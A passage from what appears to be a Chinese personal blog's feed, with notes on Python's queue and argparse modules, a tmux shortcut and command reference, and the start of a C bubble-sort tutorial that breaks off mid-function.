为某一正整数时，则等待 N 秒，如果队列中还没有数据放入的话就引发 queue.Empty 异常。</li><li>timeout：设置超时时间。</li></ul><p>④ <code>q.get_nowait()</code></p><blockquote><p>相当于 Queue.get(block=False)block，当队列中没有数据元素继续取数据时直接引发 queue.Empty 异常。</p></blockquote><p>⑤ <code>q.qsize()</code></p><blockquote><p>返回队列中数据元素的个数。</p></blockquote><p>⑥ <code>q..empty()</code></p><blockquote><p>如果队列为空，返回 True，否则返回 False。</p><p>示例如下：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line">q = queue.Queue()</span><br><span class="line">print(q.empty())  <span class="comment"># 对列为空，返回 True</span></span><br><span class="line">q.put(<span class="string">'python-100'</span>)  <span class="comment"># 在队列中插入元素 'python-100'</span></span><br><span class="line">print(q.empty())  <span class="comment"># 对列不为空，返回 False</span></span><br></pre></td></tr></table></figure><p>⑦ <code>q.full()</code></p><blockquote><p>如果队列中元素个数达到上限，返回 True，否则返回 False。</p></blockquote><h4 id="2queue的异常"><a class="markdownIt-Anchor" href="#2queue的异常"></a> 2.queue的异常</h4><p>① <code>queue.Full 异常</code></p><blockquote><p>当队列数据元素容量达到上限时，继续往队列中放入数据会引发 queue.Empty 异常，主要是不正当使用 put() 和 put_nowait() 引起的。</p></blockquote><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    q = queue.Queue(<span class="number">3</span>)  <span class="comment"># 设置队列上限为3</span></span><br><span class="line">    q.put(<span class="string">'python'</span>)  <span class="comment"># 在队列中插入字符串 'python'</span></span><br><span class="line">    q.put(<span class="string">'-'</span>) <span class="comment"># 在队列中插入字符串 '-'</span></span><br><span class="line">    q.put(<span class="string">'100'</span>) <span class="comment"># 在队列中插入字符串 '100'</span></span><br><span class="line">    q.put(<span class="string">'stay hungry, stay foolish'</span>, block=<span class="keyword">False</span>)  <span class="comment"># 队列已满，继续往队列中放入数据，引发 queue.Full 异常</span></span><br><span class="line"><span class="keyword">except</span> queue.Full:</span><br><span class="line">    print(<span class="string">'queue.Full'</span>)</span><br></pre></td></tr></table></figure><p>② <code>queue.Empty 异常</code></p><blockquote><p>当队列中没有数据元素时，取出队列中的数据会引发 queue.Empty 异常，主要是不正当使用 get() 和 get_nowait() 引起的。</p></blockquote><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    q = queue.Queue(<span class="number">3</span>)  <span class="comment"># 设置队列上限为3</span></span><br><span class="line">    q.put(<span class="string">'python'</span>)  <span class="comment"># 在队列中插入字符串 'python'</span></span><br><span class="line">    q.put(<span class="string">'-'</span>) <span class="comment"># 在队列中插入字符串 '-'</span></span><br><span class="line">    q.put(<span class="string">'100'</span>) <span class="comment"># 在队列中插入字符串 '100'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):  <span class="comment"># 从队列中取数据，取出次数为4次，引发 queue.Empty 异常</span></span><br><span class="line">        print(q.get(block=<span class="keyword">False</span>))</span><br><span class="line"><span class="keyword">except</span> queue.Empty:</span><br><span class="line">    print(<span class="string">'queue.Empty'</span>)</span><br></pre></td></tr></table></figure><h3 id="0x04-argparse-库"><a class="markdownIt-Anchor" href="#0x04-argparse-库"></a> 0x04 argparse 库</h3><blockquote><p><a href="https://docs.python.org/zh-cn/3/library/argparse.html" target="_blank" rel="noopener">官方文档</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Scan</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url, inputDict, output, threadNum)</span>:</span></span><br><span class="line">        self.url = url <span class="keyword">if</span> url.find(<span class="string">"://"</span>) != <span class="number">-1</span> <span class="keyword">else</span> <span class="string">"http://"</span>+url</span><br><span class="line">        self.inputDict = inputDict</span><br><span class="line">        self.oFileName = output+<span class="string">".txt"</span> </span><br><span class="line">        self.threadNum = threadNum</span><br><span class="line">        self.lock = threading.RLock()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">"url"</span>,   help = <span class="string">"the url you want to scan"</span>, type=str)</span><br><span class="line">    parser.add_argument(<span class="string">"-t"</span>, <span class="string">"--threadNum"</span>, dest=<span class="string">"threadNum"</span>, help = <span class="string">"The number of thread you scanning."</span>, type = int, default = <span class="number">60</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-i"</span>, <span class="string">"--input"</span>, dest=<span class="string">"inputDict"</span>, help = <span class="string">"The input about dictionary"</span>, type=str,default = <span class="string">"dict1.txt"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-o"</span>, <span class="string">"--output"</span>,dest=<span class="string">"output"</span>, help=<span class="string">"the file of output"</span>, type=str, default=<span class="string">"result"</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    scan = Scan(args.url, args.inputDict, args.output, args.threadNum)</span><br><span class="line">……</span><br></pre></td></tr></table></figure><blockquote><p>通过上面的不健全的代码可以看出argparse的用途，下面进行总结，首先创建一个解析器：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; parser = argparse.ArgumentParser(description = <span class="string">"This is a test"</span>)</span><br></pre></td></tr></table></figure><h4 id="1argparse-常用的方法"><a class="markdownIt-Anchor" href="#1argparse-常用的方法"></a> 1.argparse 常用的方法</h4><p>① <code>parser.add_argument()</code>：添加参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser.add_argument(<span class="string">'integers'</span>, metavar=<span class="string">'N'</span>, type=int, nargs=<span class="string">'+'</span>, help=<span class="string">'an integer for the accumulator'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser.add_argument(<span class="string">'--sum'</span>, dest=<span class="string">'accumulate'</span>, action=<span class="string">'store_const'</span>, const=sum, default=max, help=<span class="string">'sum the integers (default: find the max)'</span>)</span><br></pre></td></tr></table></figure><blockquote><p>定义单个的命令行参数应当如何解析。每个形参都在下面有它自己更多的描述，长话短说有：</p></blockquote><ul><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#name-or-flags" target="_blank" rel="noopener">name or flags</a> - 一个命名或者一个选项字符串的列表，例如 <code>foo</code> 或 <code>-f, --foo</code>。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#action" target="_blank" rel="noopener">action</a> - 当参数在命令行中出现时使用的动作基本类型。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#nargs" target="_blank" rel="noopener">nargs</a> - 命令行参数应当消耗的数目。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#const" target="_blank" rel="noopener">const</a> - 被一些 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#action" target="_blank" rel="noopener">action</a> 和 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#nargs" target="_blank" rel="noopener">nargs</a> 选择所需求的常数。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#default" target="_blank" rel="noopener">default</a> - 当参数未在命令行中出现时使用的值。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#type" target="_blank" rel="noopener">type</a> - 命令行参数应当被转换成的类型。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#choices" target="_blank" rel="noopener">choices</a> - 可用的参数的容器。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#required" target="_blank" rel="noopener">required</a> - 此命令行选项是否可省略 （仅选项可用）。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#help" target="_blank" rel="noopener">help</a> - 一个此选项作用的简单描述。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#metavar" target="_blank" rel="noopener">metavar</a> - 在使用方法消息中使用的参数值示例。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#dest" target="_blank" rel="noopener">dest</a> - 被添加到 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser.parse_args" target="_blank" rel="noopener"><code>parse_args()</code></a> 所返回对象上的属性名。</li></ul><p>② <code>args = parser.parse_args()</code>：解析参数</p><blockquote><p>将参数字符串转换为对象并将其设为命名空间的属性。 返回带有成员的命名空间。之前对 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser.add_argument" target="_blank" rel="noopener"><code>add_argument()</code></a> 的调用决定了哪些对象被创建以及它们如何被赋值。 请参阅 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser.add_argument" target="_blank" rel="noopener"><code>add_argument()</code></a> 的文档了解详情。</p></blockquote><ul><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#args" target="_blank" rel="noopener">args</a> - 要解析的字符串列表。 默认值是从 <a href="https://docs.python.org/zh-cn/3/library/sys.html#sys.argv" target="_blank" rel="noopener"><code>sys.argv</code></a> 获取。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#namespace" target="_blank" rel="noopener">namespace</a> - 用于获取属性的对象。 默认值是一个新的空 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.Namespace" target="_blank" rel="noopener"><code>Namespace</code></a> 对象。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x01-requests-库font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x01-requests-库font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Tmux工具使用总结</title>
    <link href="https://muzibing.github.io/2020/08/29/2020.08.29%EF%BC%88147%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/08/29/2020.08.29（147）/</id>
    <published>2020-08-28T16:00:00.000Z</published>
    <updated>2020-08-29T08:31:38.019Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-Tmux简介"><a href="#0x00-Tmux简介" class="headerlink" title="0x00 Tmux简介"></a><font color="navy"><code>0x00 Tmux简介</code></font></h3><blockquote><p>tmux是一款优秀的终端复用软件，它比Screen更加强大，至于如何强大，网上有大量的文章讨论了这点，本文不再重复。tmux之所以受人们喜爱，主要得益于以下三处功能：</p><ul><li><code>丝滑分屏（split）</code>：虽然iTem2也提供了横向和竖向分屏功能，但这种分屏功能非常拙劣，完全等同于屏幕新开一个窗口，新开的pane不会自动进入到当前目录，也没有记住当前登录状态。这意味着如果我ssh进入到远程服务器时，iTem2新开的pane中，我依然要重新走一遍ssh登录的老路（omg）。tmux就不会这样，tmux窗口中，新开的pane，默认进入到之前的路径，如果是ssh连接，登录状态也依旧保持着，如此一来，我就可以随意的增删pane，这种灵活性，好处不言而喻。</li><li><code>保护现场（attach）</code>：即使命令行的工作只进行到一半，关闭终端后还可以重新进入到操作现场，继续工作。对于ssh远程连接而言，即使网络不稳定也没有关系，掉线后重新连接，可以直奔现场，之前运行中的任务，依旧在跑，就好像从来没有离开过一样；特别是在远程服务器上运行耗时的任务，tmux可以帮你一直保持住会话。如此一来，你就可以随时随地放心地进行移动办公，只要你附近的计算机装有tmux（没有你也可以花几分钟装一个），你就能继续刚才的工作。</li><li><code>会话共享（适用于结对编程或远程教学）</code>，将 tmux 会话的地址分享给他人，这样他们就可以通过 SSH 接入该会话。如果你要给同事演示远程服务器的操作，他不必直勾勾地盯着你的屏幕，借助tmux，他完全可以进入到你的会话，然后静静地看着他桌面上你风骚的键盘走位，只要他愿意，甚至还可以录个屏。</li></ul></blockquote><h3 id="0x01-Tmux快捷指令"><a href="#0x01-Tmux快捷指令" class="headerlink" title="0x01 Tmux快捷指令"></a><font color="navy"><code>0x01 Tmux快捷指令</code></font></h3><blockquote><p>关于快捷指令，首先要认识到的是：tmux的所有指令，都包含同一个前缀，默认为<code>Ctrl+b</code>，输入完前缀过后，控制台激活，命令按键才能生效。</p></blockquote><p><code>表一：系统指令</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">前缀</th><th style="text-align:center">指令</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>?</code></td><td style="text-align:center">显示快捷键帮助文档</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>d</code></td><td style="text-align:center">断开当前会话</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>D</code></td><td style="text-align:center">选择要断开的会话</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>Ctrl+z</code></td><td style="text-align:center">挂起当前会话</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>r</code></td><td style="text-align:center">强制重载当前会话</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>s</code></td><td style="text-align:center">显示会话列表用于选择并切换</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>:</code></td><td style="text-align:center">进入命令行模式，此时可直接输入<code>ls</code>等命令</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>[</code></td><td style="text-align:center">进入复制模式，按<code>q</code>退出</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>]</code></td><td style="text-align:center">粘贴复制模式中复制的文本</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>~</code></td><td style="text-align:center">列出提示信息缓存</td></tr></tbody></table></div><p><code>表二：窗口（window）指令。</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">前缀</th><th style="text-align:center">指令</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>c</code></td><td style="text-align:center">新建窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>&amp;</code></td><td style="text-align:center">关闭当前窗口（关闭前需输入<code>y</code> or <code>n</code>确认）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>0~9</code></td><td style="text-align:center">切换到指定窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>p</code></td><td style="text-align:center">切换到上一窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>n</code></td><td style="text-align:center">切换到下一窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>w</code></td><td style="text-align:center">打开窗口列表，用于且切换窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>,</code></td><td style="text-align:center">重命名当前窗口</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>.</code></td><td style="text-align:center">修改当前窗口编号（适用于窗口重新排序）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>f</code></td><td style="text-align:center">快速定位到窗口（输入关键字匹配窗口名称）</td></tr></tbody></table></div><p><code>表三：面板（pane）指令</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">前缀</th><th style="text-align:center">指令</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>&quot;</code></td><td style="text-align:center">当前面板上下一分为二，下侧新建面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>%</code></td><td style="text-align:center">当前面板左右一分为二，右侧新建面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>x</code></td><td style="text-align:center">关闭当前面板（关闭前需输入<code>y</code> or <code>n</code>确认）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>z</code></td><td style="text-align:center">最大化当前面板，再重复一次按键后恢复正常（v1.8版本新增）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>!</code></td><td style="text-align:center">将当前面板移动到新的窗口打开（原窗口中存在两个及以上面板有效）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>;</code></td><td style="text-align:center">切换到最后一次使用的面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>q</code></td><td style="text-align:center">显示面板编号，在编号消失前输入对应的数字可切换到相应的面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>{</code></td><td style="text-align:center">向前置换当前面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>}</code></td><td style="text-align:center">向后置换当前面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>Ctrl+o</code></td><td style="text-align:center">顺时针旋转当前窗口中的所有面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>方向键</code></td><td style="text-align:center">移动光标切换面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>o</code></td><td style="text-align:center">选择下一面板</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>空格键</code></td><td style="text-align:center">在自带的面板布局中循环切换</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>Alt+方向键</code></td><td style="text-align:center">以5个单元格为单位调整当前面板边缘</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>Ctrl+方向键</code></td><td style="text-align:center">以1个单元格为单位调整当前面板边缘（Mac下被系统快捷键覆盖）</td></tr><tr><td style="text-align:center"><code>Ctrl+b</code></td><td style="text-align:center"><code>t</code></td><td style="text-align:center">显示时钟</td></tr></tbody></table></div><h3 id="0x02-会话管理"><a href="#0x02-会话管理" class="headerlink" title="0x02 会话管理"></a><font color="navy"><code>0x02 会话管理</code></font></h3><blockquote><p> 新建会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux new -s &lt;session-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>分离会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux detach</span></span><br></pre></td></tr></table></figure><blockquote><p>查看会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux ls</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> or</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux list-session</span></span><br></pre></td></tr></table></figure><blockquote><p>接入会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用会话编号</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux attach -t 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用会话名称</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux attach -t &lt;session-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>杀死会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用会话编号</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux <span class="built_in">kill</span>-session -t 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用会话名称</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux <span class="built_in">kill</span>-session -t &lt;session-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>切换会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用会话编号</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux switch -t 0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用会话名称</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux switch -t &lt;session-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>重命名会话</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux rename-session -t 0 &lt;new-name&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x03-窗口管理"><a href="#0x03-窗口管理" class="headerlink" title="0x03 窗口管理"></a><font color="navy"><code>0x03 窗口管理</code></font></h3><blockquote><p>划分窗口</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 划分上下两个窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux split-window</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 划分左右两个窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux split-window -h</span></span><br></pre></td></tr></table></figure><blockquote><p>移动光标</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 光标切换到上方窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-pane -U</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 光标切换到下方窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-pane -D</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 光标切换到左边窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-pane -L</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 光标切换到右边窗格</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-pane -R</span></span><br></pre></td></tr></table></figure><blockquote><p>交换窗口位置</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 当前窗格上移</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux swap-pane -U</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 当前窗格下移</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux swap-pane -D</span></span><br></pre></td></tr></table></figure><blockquote><p>新建窗口</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux new-window</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 新建一个指定名称的窗口</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux new-window -n &lt;window-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>切换窗口</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 切换到指定编号的窗口</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-window -t &lt;window-number&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 切换到指定名称的窗口</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tmux select-window -t &lt;window-name&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>重命名窗口</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tmux rename-window &lt;new-name&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-Tmux简介&quot;&gt;&lt;a href=&quot;#0x00-Tmux简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 Tmux简介&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 Tmux简介&lt;/code&gt;&lt;/font&gt;&lt;/h
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>算法总结（C）</title>
    <link href="https://muzibing.github.io/2020/08/28/2020.08.28%EF%BC%88146%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/08/28/2020.08.28（146）/</id>
    <published>2020-08-27T16:00:00.000Z</published>
    <updated>2020-09-06T03:12:50.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="font-color-orangec-排序算法font"><a class="markdownIt-Anchor" href="#font-color-orangec-排序算法font"></a> <font color="orange"><code>C 排序算法</code></font></h2><hr><h3 id="font-color-navy0x00-冒泡排序font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-冒泡排序font"></a> <font color="navy"><code>0x00 冒泡排序</code></font></h3><p><img src="/146-1.gif" alt></p><h4 id="1算法思想"><a class="markdownIt-Anchor" href="#1算法思想"></a> <code>1.算法思想</code></h4><p>冒泡排序的基本思想就是：</p><blockquote><p>从无序序列头部开始，进行两两比较，根据大小交换位置，直到最后将最大（小）的数据元素交换到了无序队列的队尾，从而成为有序序列的一部分；下一次继续这个过程，直到所有数据元素都排好序。</p><p>算法的核心在于每次通过两两比较交换位置，选出剩余无序序列里最大（小）的数据元素放到队尾。</p></blockquote><h4 id="2图解算法"><a class="markdownIt-Anchor" href="#2图解算法"></a> <code>2.图解算法</code></h4><p><img src="/images/146-2.png" alt></p><h4 id="3算法实现"><a class="markdownIt-Anchor" href="#3算法实现"></a> <code>3.算法实现</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bubble_sort</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, temp;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len - <span class="number">1</span> - i; j++)</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) 